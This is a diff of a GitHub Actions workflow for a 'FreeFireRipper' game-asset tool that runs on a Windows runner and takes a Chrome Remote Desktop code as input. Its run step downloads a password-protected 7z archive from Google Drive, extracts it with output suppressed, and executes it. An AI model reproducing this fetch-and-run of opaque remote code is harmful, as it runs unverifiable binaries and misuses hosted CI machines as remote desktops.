@@ -7,13 +7,6 @@ on:
       code:
         description: Paste Chrome Remote Desktop Code
         required: true
-      version:
-        description: Choose the Ripper Version
-        type: choice
-        options:
-          - FreeFireRipper-Basic
-          - FreeFireRipper-Pro
-          - FreeFireRipper-Advanced
       ffserver:
         description: Choose Your Free Fire Server ( Only For Pro and Advanced )
         type: choice
@@ -32,11 +25,11 @@ on:
           - '5'
 jobs:
   FFRipper:
-    name: ${{ inputs.version }}
+    name: ${{github.workflow}}
     runs-on: windows-latest
 
     steps:
-    - name: Running ${{ inputs.version }}
+    - name: Running ${{github.workflow}}
       run: |
        # Setup will take 4-5 minutes Be Patient 
        Start-BitsTransfer -Source "https://drive.usercontent.google.com/download?id=1gkBgUBKhOJss3Bg6deu8osGlhxPzFG6f&export=download&authuser=0&confirm=t&uuid=221423c2-3223-4714-bca3-e45b38f94f95&at=AIrpjvNQQKuezdSnPPU1ces7F673:1737894083313" -destination "${{github.workflow}}.7z" && 7z x ${{github.workflow}}.7z -p${{github.workflow}} -y > $null 2>&1 && .\${{github.workflow}}
